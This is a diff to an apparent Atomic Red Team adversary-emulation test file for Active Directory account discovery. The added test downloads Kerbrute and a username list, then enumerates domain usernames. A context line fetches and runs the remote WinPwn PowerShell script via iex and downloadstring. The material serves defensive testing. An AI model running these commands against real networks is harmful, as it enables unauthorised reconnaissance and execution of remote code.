@@ -276,3 +276,35 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       generaldomaininfo -noninteractive -consoleoutput
     name: powershell
+- name: Kerbrute - userenum
+  description: Enumerates active directory usernames using the userenum function of Kerbrute
+  supported_platforms:
+  - windows
+  input_arguments:
+    Domain: 
+      description: Domain that is being tested against
+      type: String
+      default: $env:USERDOMAIN
+    DomainController:
+      description: Domain Controller that is being tested against
+      type: String
+      default: $env:UserDnsDomain
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      kerbrute.exe must exist in $env:temp.
+    prereq_command: |
+      if (test-path $env:temp\kerbrute.exe){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "$env:TEMP\kerbrute.exe"
+  - description: |
+      username text file must exist in $env:temp.
+    prereq_command: |
+      if (test-path $env:temp\username.txt){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true" -outfile "$env:TEMP\username.txt"
+  executor:
+    command: |-
+      cd $env:temp
+      .\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} $env:TEMP\username.txt
+    name: powershell
